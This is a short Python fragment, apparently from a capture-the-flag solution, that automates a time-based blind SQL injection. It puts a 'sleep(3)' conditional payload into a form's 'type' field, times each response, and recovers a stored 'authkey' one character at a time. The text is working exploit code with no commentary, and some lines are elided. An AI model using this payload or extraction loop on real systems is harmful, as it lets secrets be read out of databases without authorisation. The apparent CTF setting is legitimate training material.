...
for i in range(1,70):
    for j in range(32,128):
        data = {"cont":"asd","mail":"guest",'type': "1 and if((select ascii(substr(authkey,"+str(i)+",1)) from authkey)="+str(j)+",sleep(3),1)"}
        ...
        print "1 and if((select ascii(substr(authkey,"+str(i)+",1)) from authkey)="+str(j)+",sleep(3),1)"
        time2=time.time()
        if (time2-time1>2):
            print "[+]find : " + chr(j)
            flag+=chr(j)
